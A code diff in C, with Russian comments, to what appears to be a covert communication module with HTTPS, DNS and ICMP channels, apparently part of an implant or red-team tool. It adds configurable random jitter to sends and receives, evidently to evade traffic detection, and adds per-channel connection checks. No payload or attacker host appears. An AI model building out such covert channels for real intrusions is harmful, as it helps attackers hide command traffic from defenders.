@@ -20,6 +20,7 @@
 #endif
 
 #include "network/covert_channel.h"
+#include "network/https_channel.h"
 
 /**
  * @brief Структура данных для хранения состояния скрытого канала связи
@@ -44,6 +45,7 @@ extern int https_channel_connect(void *handle);
 extern int https_channel_send(void *handle, const unsigned char *data, size_t data_len);
 extern int https_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
 extern void https_channel_cleanup(void *handle);
+extern bool https_channel_check_connection(void *handle);
 
 extern int icmp_channel_init(const covert_channel_config *config, void **handle);
 extern int icmp_channel_connect(void *handle);
@@ -175,10 +177,12 @@ size_t covert_channel_send(covert_channel_handle handle, const unsigned char *da
     CovertChannelData *channel_data = (CovertChannelData *)handle;
     
     // Добавление случайной задержки (jitter) перед отправкой
-    // TODO: Реализовать поддержку min_ms и max_ms
-    if (channel_data->config.c1_port > 0) { // Временное решение, пока не добавлены параметры jitter
-        int jitter_ms = rand() % 1000;
-        sleep_ms(jitter_ms);
+    if (channel_data->config.max_jitter_ms > channel_data->config.min_jitter_ms && channel_data->config.min_jitter_ms >= 0) {
+        int range = channel_data->config.max_jitter_ms - channel_data->config.min_jitter_ms + 1;
+        int jitter_ms = channel_data->config.min_jitter_ms + (rand() % range);
+        if (jitter_ms > 0) { // Добавляем проверку, чтобы не вызывать sleep_ms(0)
+             sleep_ms(jitter_ms);
+        }
     }
     
     // Вызов соответствующей функции отправки данных
@@ -220,10 +224,12 @@ size_t covert_channel_receive(covert_channel_handle handle, unsigned char *buffe
     CovertChannelData *channel_data = (CovertChannelData *)handle;
     
     // Добавление случайной задержки (jitter) перед получением
-    // TODO: Реализовать поддержку min_ms и max_ms
-    if (channel_data->config.c1_port > 0) { // Временное решение, пока не добавлены параметры jitter
-        int jitter_ms = rand() % 1000;
-        sleep_ms(jitter_ms);
+    if (channel_data->config.max_jitter_ms > channel_data->config.min_jitter_ms && channel_data->config.min_jitter_ms >= 0) {
+        int range = channel_data->config.max_jitter_ms - channel_data->config.min_jitter_ms + 1;
+        int jitter_ms = channel_data->config.min_jitter_ms + (rand() % range);
+        if (jitter_ms > 0) { // Добавляем проверку, чтобы не вызывать sleep_ms(0)
+             sleep_ms(jitter_ms);
+        }
     }
     
     // Вызов соответствующей функции получения данных
@@ -263,9 +269,9 @@ void covert_channel_set_jitter(covert_channel_handle handle, int min_ms, int max
     
     CovertChannelData *channel_data = (CovertChannelData *)handle;
     
-    // Используем доступное поле c1_port для хранения min_ms
-    // Во время отправки и приёма данных, мы будем использовать это значение
-    channel_data->config.c1_port = min_ms;
+    // Сохраняем значения в конфигурации канала
+    channel_data->config.min_jitter_ms = min_ms;
+    channel_data->config.max_jitter_ms = max_ms;
     
     // Добавляем логирование в режиме отладки
     #ifdef DEBUG
@@ -280,13 +286,27 @@ void covert_channel_set_jitter(covert_channel_handle handle, int min_ms, int max
  * @return bool true если соединение установлено, false в противном случае
  */
 bool covert_channel_is_connected(covert_channel_handle handle) {
-    // TODO: Реализовать проверку соединения
     if (handle == NULL) {
         return false;
     }
     
-    // В настоящее время просто возвращаем true, если handle не NULL
-    return true;
+    CovertChannelData *channel_data = (CovertChannelData *)handle;
+
+    // Проверка зависит от типа канала
+    switch (channel_data->channel_type) {
+        case COVERT_CHANNEL_HTTPS:
+            // Для HTTPS вызываем специальную функцию проверки
+            return https_channel_check_connection(channel_data->channel_handle);
+        
+        case COVERT_CHANNEL_DNS:
+        case COVERT_CHANNEL_ICMP:
+            // Для DNS и ICMP пока просто проверяем наличие handle
+            // TODO: Реализовать более надежную проверку для DNS/ICMP
+            return (channel_data->channel_handle != NULL);
+            
+        default:
+            return false;
+    }
 }
 
 /**
